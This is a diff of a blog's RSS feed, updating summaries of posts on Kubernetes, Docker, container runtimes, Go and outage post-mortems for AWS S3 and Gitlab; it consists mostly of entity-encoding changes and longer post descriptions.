@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Posts on Feisky</title>
@@ -119,7 +119,7 @@
       <description>Update on 2016.12.14:
 Due to a serious security problem, kubernetes v1.5.0 is not recommanded. Kubernetes v1.5.1 has just released, so we should upgrade to v1.5.1 directly.
  The --anonymous-auth= flag in v1.5.0 is true by default (which may result in any users being able to access kubernetes API), but v1.5.1 turns it to false.
- Kubernetes v1.5.0  StatefulSets (ex-PetSets)  StatefulSets are beta now (fixes and stabilization)  Improved Federation Support  New command: kubefed DaemonSets Deployments ConfigMaps  Simplified Cluster Deployment  Improvements to kubeadm HA Setup for Master  Node Robustness and Extensibility  Windows Server Container support CRI for pluggable container runtimes kubelet API supports authentication and authorization   Features Features for this release were tracked via the use of the kubernetes/features issues repo.</description>
+ Kubernetes v1.5.0  StatefulSets (ex-PetSets)  StatefulSets are beta now (fixes and stabilization)   Improved Federation Support  New command: kubefed DaemonSets Deployments ConfigMaps   Simplified Cluster Deployment  Improvements to kubeadm HA Setup for Master   Node Robustness and Extensibility  Windows Server Container support CRI for pluggable container runtimes kubelet API supports authentication and authorization    Features Features for this release were tracked via the use of the kubernetes/features issues repo.</description>
     </item>
     
     <item>
@@ -183,7 +183,7 @@ Due to a serious security problem, kubernetes v1.5.0 is not recommanded. Kuberne
       
       <guid>https://feisky.xyz/posts/2016-07-19-setup-hyperd-with-flannel-network/</guid>
       <description>Flannel Flannel is a virtual network that gives a subnet to each host for use with container runtimes.
-Platforms like Google&amp;rsquo;s Kubernetes assume that each container (pod) has a unique, routable IP inside the cluster. The advantage of this model is that it reduces the complexity of doing port mapping.
+Platforms like Google&#39;s Kubernetes assume that each container (pod) has a unique, routable IP inside the cluster. The advantage of this model is that it reduces the complexity of doing port mapping.
 flannel runs an agent, flanneld, on each host and is responsible for allocating a subnet lease out of a preconfigured address space.</description>
     </item>
     
@@ -204,7 +204,7 @@ Docker v1.12 brings in its integrated orchestration into docker engine.
       <pubDate>Fri, 17 Jun 2016 17:12:38 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2016-06-17-playing-docker-with-hypervisor-container-runtime-runv/</guid>
-      <description>Table of contents: [TOC] The latest master branch of runV has already supported running as an runtime in docker. Since v1.11, docker introduced OCI contain runtime (runc) integration via containerd. Since runc and runV are both recommended implementation of OCI, it is natural to make runV working with containerd. Now let&amp;rsquo;s have a try. Install runv and docker Docker could be installed via https://docs.docker.com/engine/installation/. Since only master branch of runV</description>
+      <description>Table of contents: [TOC] The latest master branch of runV has already supported running as an runtime in docker. Since v1.11, docker introduced OCI contain runtime (runc) integration via containerd. Since runc and runV are both recommended implementation of OCI, it is natural to make runV working with containerd. Now let&#39;s have a try. Install runv and docker Docker could be installed via https://docs.docker.com/engine/installation/. Since only master branch of runV</description>
     </item>
     
     <item>
@@ -235,8 +235,8 @@ While many developers and security professionals are comfortable with Linux cont
       <guid>https://feisky.xyz/posts/2016-05-11-how-docker-1-11-share-network-accross-containers/</guid>
       <description>Docker 1.11 has moved to runc with containerd, I am interested in how it processing shared netns accross containers.
 For example, I have already running a container 75599a6f387b7842c6da57efd38f9742b2ca621782f891402f83852c66dbd706. A new container within same netns can be created with cmd:
-docker run -itd --net=container:75599a6f387b alpine sh  This will generate a runc config.json as follows:
-{ &amp;quot;ociVersion&amp;quot;: &amp;quot;0.6.0-dev&amp;quot;, &amp;quot;platform&amp;quot;: { &amp;quot;os&amp;quot;: &amp;quot;linux&amp;quot;, &amp;quot;arch&amp;quot;: &amp;quot;amd64&amp;quot; }, &amp;quot;process&amp;quot;: { &amp;quot;terminal&amp;quot;: true, &amp;quot;user&amp;quot;: { &amp;quot;additionalGids&amp;quot;: [ 0, 1, 2, 3, 4, 6, 10, 11, 20, 26, 27 ] }, &amp;quot;args&amp;quot;: [ &amp;quot;sh&amp;quot; ], &amp;quot;env&amp;quot;: [ &amp;quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;quot;, &amp;quot;HOSTNAME=75599a6f387b&amp;quot;, &amp;quot;TERM=xterm&amp;quot; ], &amp;quot;cwd&amp;quot;: &amp;quot;/&amp;quot;, &amp;quot;capabilities&amp;quot;: [ &amp;quot;CAP_CHOWN&amp;quot;, &amp;quot;CAP_DAC_OVERRIDE&amp;quot;, &amp;quot;CAP_FSETID&amp;quot;, &amp;quot;CAP_FOWNER&amp;quot;, &amp;quot;CAP_MKNOD&amp;quot;, &amp;quot;CAP_NET_RAW&amp;quot;, &amp;quot;CAP_SETGID&amp;quot;, &amp;quot;CAP_SETUID&amp;quot;, &amp;quot;CAP_SETFCAP&amp;quot;, &amp;quot;CAP_SETPCAP&amp;quot;, &amp;quot;CAP_NET_BIND_SERVICE&amp;quot;, &amp;quot;CAP_SYS_CHROOT&amp;quot;, &amp;quot;CAP_KILL&amp;quot;, &amp;quot;CAP_AUDIT_WRITE&amp;quot; ] }, &amp;quot;root&amp;quot;: { &amp;quot;path&amp;quot;: &amp;quot;/var/lib/docker/devicemapper/mnt/d33c7932917e64bde482b437fc3ccaad9a00a04e0cf49e39f9d3be5d71991db6/rootfs&amp;quot;, &amp;quot;readonly&amp;quot;: false }, &amp;quot;hostname&amp;quot;: &amp;quot;75599a6f387b&amp;quot;, &amp;quot;mounts&amp;quot;: [ { &amp;quot;destination&amp;quot;: &amp;quot;/proc&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;proc&amp;quot;, &amp;quot;source&amp;quot;: &amp;quot;proc&amp;quot;, &amp;quot;options&amp;quot;: [ &amp;quot;nosuid&amp;quot;, &amp;quot;noexec&amp;quot;, &amp;quot;nodev&amp;quot; ] }, { &amp;quot;destination&amp;quot;: &amp;quot;/dev&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;tmpfs&amp;quot;, &amp;quot;source&amp;quot;: &amp;quot;tmpfs&amp;quot;, &amp;quot;options&amp;quot;: [ &amp;quot;nosuid&amp;quot;, &amp;quot;strictatime&amp;quot;, &amp;quot;mode=755&amp;quot; ] }, { &amp;quot;destination&amp;quot;: &amp;quot;/dev/pts&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;devpts&amp;quot;, &amp;quot;source&amp;quot;: &amp;quot;devpts&amp;quot;, &amp;quot;options&amp;quot;: [ &amp;quot;nosuid&amp;quot;, &amp;quot;noexec&amp;quot;, &amp;quot;newinstance&amp;quot;, &amp;quot;ptmxmode=0666&amp;quot;, &amp;quot;mode=0620&amp;quot;, &amp;quot;gid=5&amp;quot; ] }, { &amp;quot;destination&amp;quot;: &amp;quot;/sys&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;sysfs&amp;quot;, &amp;quot;source&amp;quot;: &amp;quot;sysfs&amp;quot;, &amp;quot;options&amp;quot;: [ &amp;quot;nosuid&amp;quot;, &amp;quot;noexec&amp;quot;, &amp;quot;nodev&amp;quot;, &amp;quot;ro&amp;quot; ] }, { &amp;quot;destination&amp;quot;: &amp;quot;/sys/fs/cgroup&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;cgroup&amp;quot;, &amp;quot;source&amp;quot;: &amp;quot;cgroup&amp;quot;, &amp;quot;options&amp;quot;: [ &amp;quot;ro&amp;quot;, &amp;quot;nosuid&amp;quot;, &amp;quot;noexec&amp;quot;, &amp;quot;nodev&amp;quot; ] }, { &amp;quot;destination&amp;quot;: &amp;quot;/dev/mqueue&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;mqueue&amp;quot;, &amp;quot;source&amp;quot;: &amp;quot;mqueue&amp;quot;, &amp;quot;options&amp;quot;: [ &amp;quot;nosuid&amp;quot;, &amp;quot;noexec&amp;quot;, &amp;quot;nodev&amp;quot; ] }, { &amp;quot;destination&amp;quot;: &amp;quot;/etc/resolv.</description>
+docker run -itd --net=container:75599a6f387b alpine sh This will generate a runc config.json as follows:
+{ &amp;#34;ociVersion&amp;#34;: &amp;#34;0.6.0-dev&amp;#34;, &amp;#34;platform&amp;#34;: { &amp;#34;os&amp;#34;: &amp;#34;linux&amp;#34;, &amp;#34;arch&amp;#34;: &amp;#34;amd64&amp;#34; }, &amp;#34;process&amp;#34;: { &amp;#34;terminal&amp;#34;: true, &amp;#34;user&amp;#34;: { &amp;#34;additionalGids&amp;#34;: [ 0, 1, 2, 3, 4, 6, 10, 11, 20, 26, 27 ] }, &amp;#34;args&amp;#34;: [ &amp;#34;sh&amp;#34; ], &amp;#34;env&amp;#34;: [ &amp;#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;#34;, &amp;#34;HOSTNAME=75599a6f387b&amp;#34;, &amp;#34;TERM=xterm&amp;#34; ], &amp;#34;cwd&amp;#34;: &amp;#34;/&amp;#34;, &amp;#34;capabilities&amp;#34;: [ &amp;#34;CAP_CHOWN&amp;#34;, &amp;#34;CAP_DAC_OVERRIDE&amp;#34;, &amp;#34;CAP_FSETID&amp;#34;, &amp;#34;CAP_FOWNER&amp;#34;, &amp;#34;CAP_MKNOD&amp;#34;, &amp;#34;CAP_NET_RAW&amp;#34;, &amp;#34;CAP_SETGID&amp;#34;, &amp;#34;CAP_SETUID&amp;#34;, &amp;#34;CAP_SETFCAP&amp;#34;, &amp;#34;CAP_SETPCAP&amp;#34;, &amp;#34;CAP_NET_BIND_SERVICE&amp;#34;, &amp;#34;CAP_SYS_CHROOT&amp;#34;, &amp;#34;CAP_KILL&amp;#34;, &amp;#34;CAP_AUDIT_WRITE&amp;#34; ] }, &amp;#34;root&amp;#34;: { &amp;#34;path&amp;#34;: &amp;#34;/var/lib/docker/devicemapper/mnt/d33c7932917e64bde482b437fc3ccaad9a00a04e0cf49e39f9d3be5d71991db6/rootfs&amp;#34;, &amp;#34;readonly&amp;#34;: false }, &amp;#34;hostname&amp;#34;: &amp;#34;75599a6f387b&amp;#34;, &amp;#34;mounts&amp;#34;: [ { &amp;#34;destination&amp;#34;: &amp;#34;/proc&amp;#34;, &amp;#34;type&amp;#34;: &amp;#34;proc&amp;#34;, &amp;#34;source&amp;#34;: &amp;#34;proc&amp;#34;, &amp;#34;options&amp;#34;: [ &amp;#34;nosuid&amp;#34;, &amp;#34;noexec&amp;#34;, &amp;#34;nodev&amp;#34; ] }, { &amp;#34;destination&amp;#34;: &amp;#34;/dev&amp;#34;, &amp;#34;type&amp;#34;: &amp;#34;tmpfs&amp;#34;, &amp;#34;source&amp;#34;: &amp;#34;tmpfs&amp;#34;, &amp;#34;options&amp;#34;: [ &amp;#34;nosuid&amp;#34;, &amp;#34;strictatime&amp;#34;, &amp;#34;mode=755&amp;#34; ] }, { &amp;#34;destination&amp;#34;: &amp;#34;/dev/pts&amp;#34;, &amp;#34;type&amp;#34;: &amp;#34;devpts&amp;#34;, &amp;#34;source&amp;#34;: &amp;#34;devpts&amp;#34;, &amp;#34;options&amp;#34;: [ &amp;#34;nosuid&amp;#34;, &amp;#34;noexec&amp;#34;, &amp;#34;newinstance&amp;#34;, &amp;#34;ptmxmode=0666&amp;#34;, &amp;#34;mode=0620&amp;#34;, &amp;#34;gid=5&amp;#34; ] }, { &amp;#34;destination&amp;#34;: &amp;#34;/sys&amp;#34;, &amp;#34;type&amp;#34;: &amp;#34;sysfs&amp;#34;, &amp;#34;source&amp;#34;: &amp;#34;sysfs&amp;#34;, &amp;#34;options&amp;#34;: [ &amp;#34;nosuid&amp;#34;, &amp;#34;noexec&amp;#34;, &amp;#34;nodev&amp;#34;, &amp;#34;ro&amp;#34; ] }, { &amp;#34;destination&amp;#34;: &amp;#34;/sys/fs/cgroup&amp;#34;, &amp;#34;type&amp;#34;: &amp;#34;cgroup&amp;#34;, &amp;#34;source&amp;#34;: &amp;#34;cgroup&amp;#34;, &amp;#34;options&amp;#34;: [ &amp;#34;ro&amp;#34;, &amp;#34;nosuid&amp;#34;, &amp;#34;noexec&amp;#34;, &amp;#34;nodev&amp;#34; ] }, { &amp;#34;destination&amp;#34;: &amp;#34;/dev/mqueue&amp;#34;, &amp;#34;type&amp;#34;: &amp;#34;mqueue&amp;#34;, &amp;#34;source&amp;#34;: &amp;#34;mqueue&amp;#34;, &amp;#34;options&amp;#34;: [ &amp;#34;nosuid&amp;#34;, &amp;#34;noexec&amp;#34;, &amp;#34;nodev&amp;#34; ] }, { &amp;#34;destination&amp;#34;: &amp;#34;/etc/resolv.</description>
     </item>
     
     <item>
@@ -245,7 +245,7 @@ docker run -itd --net=container:75599a6f387b alpine sh  This will generate a run
       <pubDate>Fri, 06 May 2016 20:40:06 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2016-05-06-go-performance-optimize/</guid>
-      <description>**Go性能优化技巧(By 雨痕) 字符串（string）作为一种不可变类型，在与字节数组（slice, [ ]byte）转换时需付出 “沉重” 代价，</description>
+      <description>**Go性能优化技巧(By 雨痕) 字符串（string）作为一种不可变类型，在与字节数组（slice, byte）转换时需付出 “沉重” 代价，根本</description>
     </item>
     
     <item>
@@ -274,7 +274,7 @@ docker run -itd --net=container:75599a6f387b alpine sh  This will generate a run
       <guid>https://feisky.xyz/posts/2016-04-28-runc/</guid>
       <description>runc is a CLI tool for spawning and running containers according to the OCI specification, while runV is a hypervisor-based runtime for OCI. Both of them are recommanded (implementations](https://github.com/opencontainers/runtime-spec/blob/master/implementations.md) of OCI.
 Playing with runc Install runc:
-yum install -y libseccomp-devel mkdir -p $GOPATH/src/github.com/opencontainers cd $GOPATH/src/github.com/opencontainers git clone https://github.com/opencontainers/runc cd runc make sudo make install  Run busybox:
+yum install -y libseccomp-devel mkdir -p $GOPATH/src/github.com/opencontainers cd $GOPATH/src/github.com/opencontainers git clone https://github.com/opencontainers/runc cd runc make sudo make install Run busybox:
 $ docker pull busybox $ mkdir rootfs $ docker export $(docker create busybox) | tar -C rootfs -xvf - $ runc spec .</description>
     </item>
     
@@ -302,7 +302,7 @@ $ docker pull busybox $ mkdir rootfs $ docker export $(docker create busybox) | 
       <pubDate>Sun, 24 Apr 2016 08:29:02 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2016-04-24-tips-for-cgo/</guid>
-      <description>cgo的一些tips 基本类型 The standard C numeric types are available under the names C.char, C.schar (signed char), C.uchar (unsigned char), C.short, C.ushort (unsigned short), C.int, C.uint (unsigned int), C.long, C.ulong (unsigned long), C.longlong (long long), C.ulonglong (unsigned long long), C.float, C.double, C.complexfloat (complex float), and C.complexdouble (complex double). The C type void* is represented by Go&amp;rsquo;s unsafe.Pointer. The C</description>
+      <description>cgo的一些tips 基本类型 The standard C numeric types are available under the names C.char, C.schar (signed char), C.uchar (unsigned char), C.short, C.ushort (unsigned short), C.int, C.uint (unsigned int), C.long, C.ulong (unsigned long), C.longlong (long long), C.ulonglong (unsigned long long), C.float, C.double, C.complexfloat (complex float), and C.complexdouble (complex double). The C type void* is represented by Go&#39;s unsafe.Pointer. The C</description>
     </item>
     
     <item>
@@ -311,7 +311,7 @@ $ docker pull busybox $ mkdir rootfs $ docker export $(docker create busybox) | 
       <pubDate>Tue, 19 Apr 2016 22:04:48 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2016-04-19-cgo-in-go-1-6/</guid>
-      <description>The major change is the definition of rules for sharing Go pointers with C code, to ensure that such C code can coexist with Go&amp;rsquo;s garbage collector. Briefly, Go and C may share memory allocated by Go when a pointer to that memory is passed to C as part of a cgo call, provided that the memory itself contains no pointers to Go-allocated memory, and provided that C does not retain the pointer after the call returns.</description>
+      <description>The major change is the definition of rules for sharing Go pointers with C code, to ensure that such C code can coexist with Go&#39;s garbage collector. Briefly, Go and C may share memory allocated by Go when a pointer to that memory is passed to C as part of a cgo call, provided that the memory itself contains no pointers to Go-allocated memory, and provided that C does not retain the pointer after the call returns.</description>
     </item>
     
     <item>
@@ -347,7 +347,7 @@ $ docker pull busybox $ mkdir rootfs $ docker export $(docker create busybox) | 
       <pubDate>Tue, 01 Mar 2016 16:33:16 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2016-03-01-10-things-to-avoid-in-docker-containers/</guid>
-      <description>Redhat发布的10 things to avoid in docker containers对于构建基于Container的服务非常有意义。摘录如下： 1) Don’t store data in containers – A container can be</description>
+      <description>Redhat发布的10 things to avoid in docker containers对于构建基于Container的服务非常有意义。摘录如下： Don’t store data in containers – A container can be stopped,</description>
     </item>
     
     <item>
@@ -424,21 +424,21 @@ Your containers run in a bare-metal environment, which avoids the &amp;ldquo;hyp
     </item>
     
     <item>
-      <title>Kubernetes系统架构简介 - feisky</title>
-      <link>https://feisky.xyz/posts/2014-11-18-kubernetes%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B-feisky/</link>
-      <pubDate>Tue, 18 Nov 2014 18:17:00 +0000</pubDate>
-      
-      <guid>https://feisky.xyz/posts/2014-11-18-kubernetes%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B-feisky/</guid>
-      <description>【摘要】1. 前言Together we will ensure that Kubernetes is a strong and open container management framework for any application and in any environment, whether i&amp;hellip; 阅读全文</description>
-    </item>
-    
-    <item>
       <title>docker网络配置方法总结 - feisky</title>
       <link>https://feisky.xyz/posts/2014-11-18-docker%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93-feisky/</link>
       <pubDate>Tue, 18 Nov 2014 18:17:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2014-11-18-docker%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93-feisky/</guid>
       <description>【摘要】docker启动时，会在宿主主机上创建一个名为docker0的虚拟网络接口，默认选择172.17.42.1/16，一个16位的子网掩</description>
+    </item>
+    
+    <item>
+      <title>Kubernetes系统架构简介 - feisky</title>
+      <link>https://feisky.xyz/posts/2014-11-18-kubernetes%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B-feisky/</link>
+      <pubDate>Tue, 18 Nov 2014 18:17:00 +0000</pubDate>
+      
+      <guid>https://feisky.xyz/posts/2014-11-18-kubernetes%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B-feisky/</guid>
+      <description>【摘要】1. 前言Together we will ensure that Kubernetes is a strong and open container management framework for any application and in any environment, whether i&amp;hellip; 阅读全文</description>
     </item>
     
     <item>
@@ -456,7 +456,16 @@ Your containers run in a bare-metal environment, which avoids the &amp;ldquo;hyp
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2017-02-13-software-engineering-at-google/</guid>
-      <description>layout: post title: Software Engineering at Google date: 2017-02-13 19:36:09 tags: [Google] Google的Fergus Henderson在Software Engineering at Google中介绍了Google的软件工程实践。 软</description>
+      <description>layout: post title: Software Engineering at Google date: 2017-02-13 19:36:09 tags: [Google] Google的Fergus Henderson在Software Engineering at Google中介绍了Google的软件工程实践。
+软件开发 源码仓库
+ 单一源代码仓库，除了核心配置和安全相关代码，任何工程师都可以访问任何代码，并可以根据需要修改 所有开发都基于master分支，发布的时候才创建发布分枝 代码的每个子树都有owner，任何修改都需要owner批准  Blaze分布式构建系统
+ 构建和测试存储库中的任何软件通常非常简单和快捷 开发人员只需要编写BUILD文件，并且每个构建系统仅依赖BUILD文件所声明的文件 构建系统的优化：可靠，自动跟踪依赖关系，增量构建，缓存构建结果以便复用 自动代码检查和测试  代码审查
+ 完善的代码审查工具，如可视化的Web界面、电子邮件集成、自动展示测试或静态分析的结果 每个变更都必须由至少另外一人审查，并将审查结果自动复制到项目维护者的邮件列表 鼓励小的变更，大的变更可以拆分为一系列较小的变更  测试
+ 鼓励和广泛使用单元测试，Mocking非常普遍 广泛使用集成测试和回归测试 自动测量测试覆盖率 部署之前进行负载测试，显示关键的metrics，比如延迟、错误率以及它们随请求速率的变化情况  Bug跟踪
+ Google使用名为Buganizer的Bug跟踪系统 使用标签分类bug 每个bug都有一个默认的assignee和抄送邮件列表  编程语言
+ 鼓励使用C++、Java、Python或Go之一，最小化不同编程语言的数量 每种语言都有Google风格指南，还有一个公司范围内的可读性培训 不同语言之前使用基于Protocol Buffers的RPC通信 为所有语言提供通用的开发工具，比如代码签出、编辑、构建、测试、审查、bug报告等  调试和分析
+ 在通用框架中提供调试和代码跟踪工具 提供用于调试的网络接口检查RPC调用的时间、错误率和频率限制以及资源消耗、性能分析数据等  发布
+ 频繁发布（比如每周或每两周），自动化发布任务，提高工程师积极性，允许更多迭代以加快整体速度 发布分支，将master的修改cherry-pick到发布分支 发布到staging服务器，测试部分生产流量的副本 发布到canary服务器，测试真实生产流量的一个子集 最后逐步发布到所有服务器  Launch approval</description>
     </item>
     
     <item>
@@ -465,7 +474,11 @@ Your containers run in a bare-metal environment, which avoids the &amp;ldquo;hyp
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2017-03-03-aws-s3%E6%95%85%E9%9A%9C%E5%9B%9E%E9%A1%BE%E5%92%8C%E6%80%BB%E7%BB%93/</guid>
-      <description>layout: post title: AWS S3故障回顾和总结 date: 2017-03-03 22:27:50 tags: [aws] S3故障回顾 2月28日，AWS工程师在排查Northern Virginia (US-EAST-1) Region的一个S3计费问题时，因敲错了</description>
+      <description>layout: post title: AWS S3故障回顾和总结 date: 2017-03-03 22:27:50 tags: [aws] S3故障回顾 2月28日，AWS工程师在排查Northern Virginia (US-EAST-1) Region的一个S3计费问题时，因敲错了一条playbook的参数而误删了大量的s3控制服务引发了4小时的故障。这个误操作影响了两个S3的核心系统：
+ Index系统，管理S3对象的元数据和位置，主要处理GET、LIST、PUT、DELETE请求 Placement系统，管理新存储的分配和，主要处理PUT请求  由于S3的故障，一大批依赖于S3的AWS服务也发生故障（如EC2、EBS和Lambda等），进而也影响了近半的北美互联网服务。不过，这次故障只是影响了用户的访问，并没有丢失数据（可靠性还是保障的，S3有7个9的可靠性和4个9的可用性）。
+虽然aws s3具有优秀的故障设计，在故障发生时一般会自动恢复。但是，由于s3极好的稳定性，Index和Placement系统已经多年未重启过了，这次重启重建index的时间超过预期，并且placement依赖于index系统，导致系统恢复花费了较长的时间。
+改进措施  完善工具，保证即便有人操作错误也不会引发故障（对事不对人） 让删除操作缓慢些（以便有时间反悔） 加上一个最小资源数限制的SafeGuard 拆分现有的服务为更小单元（factoring services into cells），减小服务故障影响面，缩短服务的恢复时间  教训  高可用很难，不仅包括系统架构的高可用，更包括运维的高可用 跨Region和跨Availability Zone的重要性（比如Amazon和Netflix的服务并未受影响，因为它们在设计之初就处理了Region失效的问题），可以考虑的方案包括  跨Region的数据备份和恢复 跨Region的主从服务，包括Warm standby和Hot standby 跨Region的主主服务   故障恢复的重要性，充分保证Recovery Time Objective (RTO) and Recovery Point Objective (RPO) 自动化，人总是会犯错的，应该用技术而不是管理来解决问题（敏感操作放慢进程，以便有时间反悔） 故障和恢复演练，比如Google SRE指出他们有一个定期的服务停机计划，以验证系统是否真的符合预期  一个高可用系统的参考架构，图片来自The Learning AWS Blog
+参考链接  Summary of the Amazon S3 Service Disruption in the Northern Virginia (US-EAST-1) Region How should we think about the aws outage Hacker News讨论 AWS 的 S3 故障回顾和思考  </description>
     </item>
     
     <item>
@@ -474,7 +487,10 @@ Your containers run in a bare-metal environment, which avoids the &amp;ldquo;hyp
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2017-03-03-gitlab%E6%95%85%E9%9A%9C%E5%9B%9E%E9%A1%BE%E5%92%8C%E6%80%BB%E7%BB%93/</guid>
-      <description>layout: post title: Gitlab故障回顾和总结 date: 2017-03-03 22:27:37 tags: [] Gitlab故障回顾 1月31日，Giblab在修复一个PostgreSQL数据同步问题（DB Replication lagged too</description>
+      <description>layout: post title: Gitlab故障回顾和总结 date: 2017-03-03 22:27:37 tags: [] Gitlab故障回顾 1月31日，Giblab在修复一个PostgreSQL数据同步问题（DB Replication lagged too far behind）时，误将生产环境的数据删除（本来是计划删除db1上的数据，结果发现在错误的db2上操作了）。进而寻求从备份数据恢复，结果发现没有实时备份：
+ LVM Snapshot每24小时备份一次，最新数据是6小时前的 常规备份由于pg_dump客户端版本问题失效 Azure Disk snapshot未启用 数据库同步会导致webhook删除，所以webhook只能从备份中恢复 S3 备份未生效，bucket为空 糟糕的备份流程，并且没有明确的文档  最后，Gitlab只能从LVM snapshot上恢复6小时前的数据。由于备份机器性能极差，并且数据拷贝极慢，整个恢复过程也比较慢（18个小时）。
+改进措施 故障发生后，Gitlab列出了一系列的改进措施，包括
+ Update PS1 across all hosts to more clearly differentiate between hosts and environments (#1094) Prometheus monitoring for backups (#1095) Set PostgreSQL&#39;s max_connections to a sane value (#1096) Investigate Point in time recovery &amp;amp; continuous archiving for PostgreSQL (#1097) Hourly LVM snapshots of the production databases (#1098) Azure disk snapshots of production databases (#1099) Move staging to the ARM environment (#1100) Recover production replica(s) (#1101) Automated testing of recovering PostgreSQL database backups (#1102) Improve PostgreSQL replication documentation/runbooks (#1103) Investigate pgbarman for creating PostgreSQL backups (#1105) Investigate using WAL-E as a means of Database Backup and Realtime Replication (#494) Build Streaming Database Restore Assign an owner for data durability Bundle pgpool-II 3.</description>
     </item>
     
     <item>
@@ -483,7 +499,12 @@ Your containers run in a bare-metal environment, which avoids the &amp;ldquo;hyp
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2017-03-15-kubernetes-ha/</guid>
-      <description>layout: post title: Kubernetes HA date: 2017-03-15 18:12:47 tags: [kubernetes] Kubernetes从1.5开始，通过kops或者kube-up.sh部署的集群会自动部署一个高可用的系统，包括 etcd</description>
+      <description>layout: post title: Kubernetes HA date: 2017-03-15 18:12:47 tags: [kubernetes] Kubernetes从1.5开始，通过kops或者kube-up.sh部署的集群会自动部署一个高可用的系统，包括
+ etcd集群模式 apiserver负载均衡 controller manager、scheduler和cluster autoscaler自动选主（有且仅有一个运行实例）  如下图所示
+etcd集群 从https://discovery.etcd.io/new?size=3获取token后，把https://kubernetes.io/docs/admin/high-availability/etcd.yaml放到每台机器的/etc/kubernetes/manifests/etcd.yaml，并替换掉${DISCOVERY_TOKEN}, ${NODE_NAME}和${NODE_IP}，既可以由kubelet来启动一个etcd集群。
+对于运行在kubelet外部的etcd，可以参考etcd clustering guide来手动配置集群模式。
+apiserver 把https://kubernetes.io/docs/admin/high-availability/kube-apiserver.yaml放到每台Master节点的/etc/kubernetes/manifests/，并把相关的配置放到/srv/kubernetes/，即可由kubelet自动创建并启动apiserver:
+ basic_auth.csv - basic auth user and password ca.crt - Certificate Authority cert known_tokens.csv - tokens that entities (e.g. the kubelet) can use to talk to the apiserver kubecfg.crt - Client certificate, public key kubecfg.key - Client certificate, private key server.cert - Server certificate, public key server.</description>
     </item>
     
     <item>
@@ -492,7 +513,10 @@ Your containers run in a bare-metal environment, which avoids the &amp;ldquo;hyp
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://feisky.xyz/posts/2017-04-19-linuxkit/</guid>
-      <description>layout: post title: LinuxKit date: 2017-04-19 11:09:53 tags: [docker] LinuxKit是Docker最新发布的一个用于为容器构建安全、便携、可移植操作系统的工具包。它根据用户编写的yaml（指</description>
+      <description>layout: post title: LinuxKit date: 2017-04-19 11:09:53 tags: [docker] LinuxKit是Docker最新发布的一个用于为容器构建安全、便携、可移植操作系统的工具包。它根据用户编写的yaml（指定kernel和基于docker image的一些列服务）自动构建一个常见虚拟化平台或云平台的虚拟机镜像，并自动运行起来。主要特性包括
+ 增强安全性  系统安全，基于MirageOS unikernel 紧跟最新kernel并精简不必要的模块 Immutable，只读根文件系统，根文件系统只能在构建的时候生成 社区合作，比如Kernel Self Protection Project (KSPP)、Wireguard、Landlock、Mirage、oKernel、Clear Containers等   易用、可扩展  所有服务均可定制，且用户服务和系统服务都是基于docker image 构建过程基于docker 基于Infrakit方便部署生成的镜像    安装 git clone https://github.com/linuxkit/linuxkit $GOPATH/src/github.com/linuxkit/linuxkit make &amp;amp;&amp;amp; make install 原理 编写yaml LinuxKit需要编写一个yaml文件，来配置所需要的服务。可选的配置包括
+ kernel：指定内核镜像，镜像里面需要包含bzImage和kernel.tar init：指定根系统的docker镜像（ base init process Docker images），比如init、runc、containerd等。在运行时，这些都是只读的 onboot：启动过程中执行的系统服务，按顺序逐个运行 services：基于docker镜像的系统服务，这些服务在build的时候会由docker将其转换为OCI格式，以便后续runc来启动 files：指定额外的文件 outputs：构建完成后的输出  比如一个简单的nginx服务为
